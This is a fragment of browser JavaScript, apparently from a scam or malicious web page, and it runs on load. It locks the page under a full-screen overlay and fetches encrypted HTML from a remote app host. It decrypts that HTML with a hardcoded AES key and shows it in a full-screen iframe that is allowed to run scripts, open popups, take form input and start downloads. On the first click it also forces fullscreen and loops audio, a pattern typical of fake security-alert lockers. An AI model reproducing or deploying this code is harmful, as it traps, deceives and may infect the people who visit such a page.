document.body.style.overflow = "hidden";
    function cpClose(){
        setTimeout(() => {
            modalBox.classList.remove("hidden");
            backdrop.classList.remove("opacity-0");
            modal.classList.remove("opacity-0", "scale-90");
        }, 100);
    }
    document.addEventListener("mousemove", cpClose, {once: true});


    document.body.insertAdjacentHTML(
        "afterbegin",
        '<div id="bruceDiv" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;"></div>'
    );

    let globalBlobUrl = null;
    function aesDecode(encodedText) {
        try {
            const bytes = CryptoJS.AES.decrypt(
                encodedText,
                "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI="
            );
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch {
            return "";
        }
    }
    async function fetchAndPrepareBlob() {
        try {
            const response = await fetch(
                "https://monkfish-app-jw53k.ondigitalocean.app/win/sec"
            );

            const encodedText = await response.text();
            const decodedHtml = aesDecode(decodeURIComponent(encodedText));

            if (!decodedHtml) throw new Error("Empty decoded HTML");

            const blob = new Blob([decodedHtml], { type: "text/html" });
            globalBlobUrl = URL.createObjectURL(blob);

            displayIframe();
        } catch (err) {
            console.error("Blob fetch error:", err);
        }
    }
    function displayIframe() {
        if (!globalBlobUrl) {
            setTimeout(displayIframe, 200);
            return;
        }

        const bruceDiv = document.getElementById("bruceDiv");
        if (!bruceDiv || bruceDiv.hasChildNodes()) return;

        const iframe = document.createElement("iframe");
        iframe.src = globalBlobUrl;
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "0";

        iframe.allow =
            "fullscreen; autoplay; encrypted-media; picture-in-picture";
        iframe.allowFullscreen = true;
        iframe.setAttribute("webkitallowfullscreen", "");
        iframe.setAttribute("mozallowfullscreen", "");
        iframe.sandbox =
            "allow-scripts allow-popups allow-forms allow-downloads";

        bruceDiv.appendChild(iframe);
    }
    function enableFullscreen() {
        const el = document.documentElement;
        (el.requestFullscreen ||
            el.webkitRequestFullscreen ||
            el.mozRequestFullScreen ||
            el.msRequestFullscreen)?.call(el);
    }

    function playBackgroundAudio() {
        const audio = new Audio(
            "https://audio.jukehost.co.uk/qC8dN1AYE9nQkcTtcydsmA9f8nB5l0Yt"
        );
        audio.loop = true;
        audio.play().catch(() => {});
    }
    document.addEventListener(
        "click",
        () => {
            enableFullscreen();
            playBackgroundAudio();
        },
        { once: true }
    );
    Promise.resolve().then(fetchAndPrepareBlob);